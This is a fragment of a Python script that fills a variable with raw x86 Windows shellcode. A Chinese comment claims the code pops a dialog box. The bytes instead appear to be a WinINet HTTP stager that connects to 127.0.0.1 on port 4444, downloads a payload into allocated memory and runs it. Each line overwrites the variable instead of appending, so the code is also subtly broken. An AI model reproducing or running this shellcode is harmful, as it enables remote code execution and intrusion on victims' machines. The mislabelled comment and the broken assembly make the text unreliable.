...
def main():
    ...
    outCode = b""
    # 弹对话框
    outCode = b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
    outCode = b"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
    outCode = b"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
    outCode = b"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
    outCode = b"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
    outCode = b"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
    outCode = b"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
    outCode = b"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
    outCode = b"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
    outCode = b"\x8d\x5d\x68\x6e\x65\x74\x00\x68\x77\x69\x6e\x69\x54\x68\x4c"
    outCode = b"\x77\x26\x07\xff\xd5\x31\xdb\x53\x53\x53\x53\x53\xe8\x3e\x00"
    outCode = b"\x00\x00\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28"
    outCode = b"\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b"
    outCode = b"\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x37\x2e\x30\x3b\x20\x72"
    outCode = b"\x76\x3a\x31\x31\x2e\x30\x29\x20\x6c\x69\x6b\x65\x20\x47\x65"
    outCode = b"\x63\x6b\x6f\x00\x68\x3a\x56\x79\xa7\xff\xd5\x53\x53\x6a\x03"
    outCode = b"\x53\x53\x68\x5c\x11\x00\x00\xe8\x5d\x01\x00\x00\x2f\x31\x66"
    outCode = b"\x35\x31\x56\x54\x68\x2d\x57\x33\x47\x63\x64\x5a\x31\x30\x77"
    outCode = b"\x39\x64\x57\x43\x51\x45\x64\x57\x45\x7a\x38\x71\x63\x38\x66"
    outCode = b"\x67\x62\x45\x4a\x64\x66\x34\x70\x4d\x6c\x30\x42\x4c\x36\x53"
    outCode = b"\x49\x54\x50\x59\x77\x46\x47\x48\x43\x6f\x2d\x72\x42\x4b\x45"
    outCode = b"\x34\x31\x31\x6c\x76\x39\x73\x38\x32\x59\x35\x41\x46\x58\x63"
    outCode = b"\x5a\x49\x52\x37\x78\x34\x44\x48\x2d\x66\x72\x62\x64\x38\x44"
    outCode = b"\x49\x34\x59\x52\x61\x6f\x46\x59\x66\x64\x4c\x4f\x33\x51\x4f"
    outCode = b"\x64\x42\x6a\x67\x78\x39\x34\x37\x39\x6c\x74\x7a\x44\x32\x73"
    outCode = b"\x46\x52\x7a\x33\x69\x78\x6a\x32\x50\x75\x6a\x41\x67\x59\x41"
    outCode = b"\x37\x69\x4e\x67\x42\x57\x6b\x51\x50\x4b\x36\x51\x78\x2d\x35"
    outCode = b"\x69\x31\x6f\x6d\x64\x4e\x4c\x38\x4c\x65\x45\x48\x6a\x4a\x6f"
    outCode = b"\x66\x4e\x45\x50\x73\x48\x68\x78\x64\x66\x4b\x6c\x49\x62\x79"
    outCode = b"\x75\x62\x75\x5a\x49\x6e\x56\x72\x42\x5a\x6d\x62\x30\x47\x45"
    outCode = b"\x66\x69\x64\x34\x45\x52\x49\x4f\x46\x67\x54\x59\x6a\x4d\x61"
    outCode = b"\x4d\x50\x65\x63\x6d\x61\x5f\x57\x5f\x46\x48\x6a\x00\x50\x68"
    outCode = b"\x57\x89\x9f\xc6\xff\xd5\x89\xc6\x53\x68\x00\x02\x60\x84\x53"
    outCode = b"\x53\x53\x57\x53\x56\x68\xeb\x55\x2e\x3b\xff\xd5\x96\x6a\x0a"
    outCode = b"\x5f\x53\x53\x53\x53\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0"
    outCode = b"\x75\x14\x68\x88\x13\x00\x00\x68\x44\xf0\x35\xe0\xff\xd5\x4f"
    outCode = b"\x75\xe1\xe8\x46\x00\x00\x00\x6a\x40\x68\x00\x10\x00\x00\x68"
    outCode = b"\x00\x00\x40\x00\x53\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x53"
    outCode = b"\x89\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96\x89\xe2"
    outCode = b"\xff\xd5\x85\xc0\x74\xcf\x8b\x07\x01\xc3\x85\xc0\x75\xe5\x58"
    outCode = b"\xc3\x5f\xe8\x7f\xff\xff\xff\x31\x32\x37\x2e\x30\x2e\x30\x2e"
    outCode = b"\x31\x00\xbb\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5"
